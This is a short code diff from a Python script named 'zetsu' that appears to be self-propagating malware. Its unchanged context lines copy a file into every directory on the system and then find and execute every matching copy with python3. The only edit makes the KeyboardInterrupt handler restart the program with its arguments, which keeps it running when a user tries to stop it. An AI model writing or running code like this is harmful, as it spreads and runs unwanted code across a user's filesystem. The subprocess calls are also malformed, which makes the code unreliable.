@@ -57,7 +57,7 @@ class zetsu:
                     subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',dir,'@'])
                     subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
             except KeyboardInterrupt:
-                zetsu.main()
+                zetsu.main(self.nn, self.ii, self.ff, self.pj, self.yh)
 
 if __name__ == "__main__":
     perintah = argv
